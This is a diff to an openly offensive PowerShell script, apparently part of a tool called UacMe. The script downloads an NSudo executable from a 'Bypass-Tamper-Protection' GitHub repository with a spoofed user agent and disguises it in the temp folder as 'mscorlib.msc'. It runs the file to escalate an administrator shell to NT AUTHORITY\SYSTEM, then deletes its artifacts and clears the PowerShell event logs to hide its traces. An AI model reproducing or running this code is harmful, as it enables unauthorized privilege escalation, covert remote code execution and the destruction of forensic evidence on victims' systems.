@@ -201,22 +201,21 @@ If($Action -ieq "Elevate"){
 
    $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")
    If($IsClientAdmin){## From administrator => NT AUTHORITY\SYSTEM
-      Write-Host "`n`n[admin] Elevating privileges to NT AUTHORITY\SYSTEM!" -ForeGroundColor Yellow
+      Write-Host "`n`n[admin] Elevating privileges to NT AUTHORITY\SYSTEM!`n" -ForeGroundColor Yellow
    
       ## Download and masquerade the required standalone executable
-      $RandomMe = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_})
-      If(-not(Test-Path -Path "$Env:TMP\$RandomMe.msc" -EA SilentlyContinue)){
-         iwr -Uri https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -OutFile $Env:TMP\$RandomMe.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
+      If(-not(Test-Path -Path "$Env:TMP\mscorlib.msc" -EA SilentlyContinue)){
+         iwr -Uri https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -OutFile $Env:TMP\mscorlib.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
       }
 
-      If(-not(Test-Path -Path "$Env:TMP\$RandomMe.msc" -EA SilentlyContinue)){
+      If(-not(Test-Path -Path "$Env:TMP\mscorlib.msc" -EA SilentlyContinue)){
 
-         Write-Host "[error] fail to download: $Env:TMP\$RandomMe.msc!`n`n" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "[error] fail to download: $Env:TMP\mscorlib.msc!`n`n" -ForegroundColor Red -BackgroundColor Black
          exit ## Exit @redpill
 
       }Else{## Execute Binary to elevate shell to NT AUTHORITY\SYSTEM
 
-         cd $Env:TMP;.\$RandomMe.msc -U:T -P:E $Execute
+         cd $Env:TMP;.\mscorlib.msc -U:T -P:E $Execute
          cd $Working_Directory ## Return to @UacMe working directory
 
       }
@@ -236,12 +235,12 @@ If($Action -ieq "Elevate"){
 
       ## Build Output Table
       Write-Host "`nUAC State    : $UacStatus"
-      Write-Host "EOP Trigger  : $Env:TMP\$RandomMe.msc"
+      Write-Host "EOP Trigger  : $Env:TMP\mscorlib.msc"
       Write-Host "Execute      : $Execute`n`n"
    
       ## Clean ALL artifacts left behind!
       Remove-Item -Path "$Env:TMP\graca.log" -EA SilentlyContinue -Force
-      Remove-Item -Path "$Env:TMP\$RandomMe.msc" -EA SilentlyContinue -Force
+      Remove-Item -Path "$Env:TMP\mscorlib.msc" -EA SilentlyContinue -Force
 
    exit ## Exit @UacMe
    }## End of 'admin => system' function!
@@ -489,7 +488,7 @@ If($Action -ieq "Clean"){
 
    ## This function deletes ALL .cs|.bat|.msc files from '%tmp%'
    # directory. If the 'CreationTime' of the files Matches todays date!
-   $CleanInf = (Get-ChildItem -Path "$Env:TMP" | Where-Object { 
+   $CleanInf = (Get-ChildItem -Path "$Env:TMP" -EA SilentlyContinue | Where-Object { 
       $_.CreationTime.ToString() -Match "$Date" -and $_.Name -iMatch '(.cs|.bat|.msc)$' 
    }).FullName
    ForEach($Item in $CleanInf){## Delete ALL .cs|.bat|.msc files from %tmp%
@@ -500,7 +499,7 @@ If($Action -ieq "Clean"){
 
    ## This function deletes ALL .inf files from 'C:\Windows\Temp'
    # directory. If the 'CreationTime' of the files Matches todays date!
-   $CleanInf = (Get-ChildItem -Path "$Env:WINDIR\temp" | Where-Object { 
+   $CleanInf = (Get-ChildItem -Path "$Env:WINDIR\temp" -EA SilentlyContinue | Where-Object { 
       $_.CreationTime.ToString() -Match "$Date" -and $_.Name -Match '(.inf)$' 
    }).FullName
    ForEach($Item in $CleanInf){## Delete ALL .inf files from C:\Windows\Temp
@@ -519,7 +518,7 @@ If($Action -ieq "Clean"){
          $_ -Match 'numberOfLogRecords:' }).split(':')[1] -replace ' ',''
 
       If($CleanPSo -gt 0){## Delete ALL Powershell LogFiles
-         Write-Host "[+] Eventvwr Powershell/Operational Logs Deleted!" -ForeGroundColor Yellow
+         Write-Host "Eventvwr Powershell/Operational Logs Deleted!" -ForeGroundColor Yellow
          wevtutil cl "Microsoft-Windows-Powershell/Operational" | Out-Null
          $PowershellLogs = $PowershellLogs+1 ## Count how many artifacts are cleanned!
       }
@@ -528,7 +527,7 @@ If($Action -ieq "Clean"){
          $_ -Match 'numberOfLogRecords:' }).split(':')[1] -replace ' ',''
 
       If($CleanWPS -gt 0){## Delete ALL Powershell LogFiles
-         Write-Host "[+] Eventvwr Windows Powershell Logs Deleted!" -ForeGroundColor Yellow
+         Write-Host "Eventvwr Windows Powershell Logs Deleted!" -ForeGroundColor Yellow
          wevtutil cl "Windows Powershell" | Out-Null
          $PowershellLogs = $PowershellLogs+1 ## Count how many artifacts are cleanned!         
       }
@@ -559,4 +558,4 @@ If($Action -ieq "Clean"){
    }
 
 }
-Write-Host "`n`n"
+Write-Host "`n"
